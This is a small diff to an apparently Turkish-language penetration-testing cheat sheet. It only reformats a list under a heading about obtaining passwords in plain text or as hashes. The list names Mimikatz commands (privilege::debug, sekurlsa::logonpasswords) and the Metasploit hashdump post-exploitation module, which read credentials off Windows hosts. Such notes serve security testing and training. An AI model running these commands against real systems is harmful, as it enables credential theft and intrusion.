@@ -4,8 +4,8 @@
 
 * Parola Elde Etme (düz metin veya hash)
 	- Mimikatz	
-		mimikatz # privilege::debug
-		mimikatz # sekurlsa::logonpasswords
+		- mimikatz # privilege::debug
+		- mimikatz # sekurlsa::logonpasswords
 	- run post/windows/gather/hashdump
 
 * Yüksek Yetkilere Sahip Kullanıcı Hesabı Kullanımı
